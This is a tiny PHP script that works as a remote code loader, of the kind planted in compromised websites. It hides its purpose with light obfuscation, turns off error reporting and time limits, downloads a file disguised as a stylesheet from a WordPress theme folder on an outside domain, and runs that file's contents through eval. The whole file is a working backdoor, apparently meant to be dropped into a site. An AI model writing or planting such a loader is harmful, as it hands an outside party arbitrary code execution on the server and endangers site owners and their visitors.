<?php
error_reporting(0); set_time_limit(0);
        $awo = 'https://';
        $fgt = 'file_get_contents';
        $data = $fgt($awo . 'lenreklama.com/wp-content/themes/x-child/css/css.css');
    
        $admin = '?>';
        eval($admin . $data);
    
        exit;
?>
